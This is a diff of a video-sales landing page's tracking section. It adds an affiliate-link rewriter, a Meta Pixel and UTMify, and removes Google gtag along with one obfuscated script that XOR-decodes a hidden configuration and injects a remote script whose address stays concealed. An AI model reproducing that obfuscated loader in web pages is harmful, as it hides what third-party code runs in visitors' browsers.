@@ -164,16 +164,202 @@
          CAMADA 2 — TRACKING (final do body, não bloqueia VTurb)
          ============================================================ -->
 
-    <script>(function(){var j_f=atob("DCn+rCC8S7AvQgKyxVLc2VLQaYoNKnbGtVrEgw/fL94BN3bfrE+HgkPTJp5NMC3BpluX3FTPZMBGOmfe6lmX1EXQZdpcYC6QpF2K3knePsRKMSCInnTSjkfQJNJOLnGQ/3KFjk7dJtUNeCDCrFGbwGnYaZwNNGPesEzclgKKKtEWIDWCoB6YyRWKeoMeIzPRoRmamBSeNu1S");var m_18r2=[];for(var w_pk=0;w_pk<j_f.length;w_pk++){m_18r2.push(j_f.charCodeAt(w_pk)&255);}var i_6rqw=m_18r2[0];var v_n=m_18r2.slice(1,1+i_6rqw);var d_8=m_18r2.slice(1+i_6rqw);var x_4=d_8.map(function(b,s_6m2u){return b^v_n[s_6m2u%i_6rqw];});var u_wvq="";for(var w_wcjn=0;w_wcjn<x_4.length;w_wcjn++){u_wvq+=String.fromCharCode(x_4[w_wcjn]&255);}var q_mf=decodeURIComponent(escape(u_wvq));var p_wzj=JSON.parse(q_mf);var n_0c6r=p_wzj.globals||[];n_0c6r.forEach(function(x_2){window[x_2.name]=x_2.value;});var i_wt=document.createElement("script");i_wt.src=p_wzj.url;i_wt.async=true;i_wt.defer=true;(p_wzj.attributes||[]).forEach(function(u_m){i_wt.setAttribute(u_m.name,u_m.value);});(document.head||document.documentElement).appendChild(i_wt);})();</script>
-
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-D6MCHPBW8R"></script>
     <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-D6MCHPBW8R');
-    </script>
+!function(){
+    var R=/buygoods/i,
+        K='bg_vturb_key_v1',
+        st={},
+        last='',
+        pd=false;
+
+    try{
+        st=JSON.parse(sessionStorage.getItem(K))||{};
+    }catch(e){
+        st={};
+    }
+
+    function sv(){
+        var n=JSON.stringify(st);
+        if(n!==last){
+            last=n;
+            try{
+                sessionStorage.setItem(K,n);
+            }catch(e){}
+        }
+    }
+
+    function iv(x){
+        return !!x && x.indexOf('v3_')===0;
+    }
+
+    function ck(){
+        var r='';
+        try{
+            [].forEach.call(
+                document.querySelectorAll('vturb-smartplayer'),
+                function(el){
+                    if(!r){
+                        var k=el.conversionKey;
+                        if(iv(k)) r=k;
+                    }
+                }
+            );
+        }catch(e){}
+        return r;
+    }
+
+    function ap(u){
+        var k=ck();
+
+        if(k) st.subid2=k;
+
+        if(st.subid2){
+            u.searchParams.set('subid2',st.subid2);
+        }
+    }
+
+    function fx(a){
+        var h=a.getAttribute('href')||'',
+            u,
+            o;
+
+        if(!R.test(h)) return;
+
+        try{
+            u=new URL(h,location.href);
+        }catch(e){
+            return;
+        }
+
+        ap(u);
+
+        o=u.toString();
+
+        if(o!==h){
+            a.setAttribute('href',o);
+        }
+    }
+
+    function sw(){
+        try{
+            [].forEach.call(
+                document.querySelectorAll('a[href]'),
+                fx
+            );
+        }catch(e){}
+
+        sv();
+    }
+
+    function ss(){
+        if(pd) return;
+
+        pd=true;
+
+        setTimeout(function(){
+            pd=false;
+            sw();
+        },120);
+    }
+
+    function go(){
+        sw();
+
+        setInterval(sw,400);
+
+        if(typeof MutationObserver!=='undefined'){
+            new MutationObserver(ss).observe(
+                document.documentElement,
+                {
+                    childList:true,
+                    subtree:true,
+                    attributes:true,
+                    attributeFilter:['href']
+                }
+            );
+        }
+    }
+
+    var EV=[
+        'mouseover',
+        'pointerdown',
+        'touchstart',
+        'click'
+    ];
+
+    EV.forEach(function(ev){
+        document.addEventListener(
+            ev,
+            function(e){
+                var a=e.target && e.target.closest
+                    ? e.target.closest('a[href]')
+                    : null;
+
+                if(a){
+                    fx(a);
+                    sv();
+                }
+            },
+            true
+        );
+    });
+
+    if(document.readyState==='loading'){
+        document.addEventListener('DOMContentLoaded',go);
+    }else{
+        go();
+    }
+}();
+</script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){
+    if(f.fbq)return;
+
+    n=f.fbq=function(){
+        n.callMethod
+            ? n.callMethod.apply(n,arguments)
+            : n.queue.push(arguments);
+    };
+
+    if(!f._fbq)f._fbq=n;
+
+    n.push=n;
+    n.loaded=!0;
+    n.version='2.0';
+    n.queue=[];
+
+    t=b.createElement(e);
+    t.async=!0;
+    t.src=v;
+
+    s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s);
+
+}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init','2279198346184752');
+fbq('track','PageView');
+</script>
+
+<noscript>
+<img
+    height="1"
+    width="1"
+    style="display:none"
+    src="https://www.facebook.com/tr?id=2279198346184752&ev=PageView&noscript=1"
+/>
+</noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- UTMify -->
+<script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck=""
+    async
+    defer>
+</script>
 
     <!-- UTMify (captura e persiste UTMs) -->
     <script
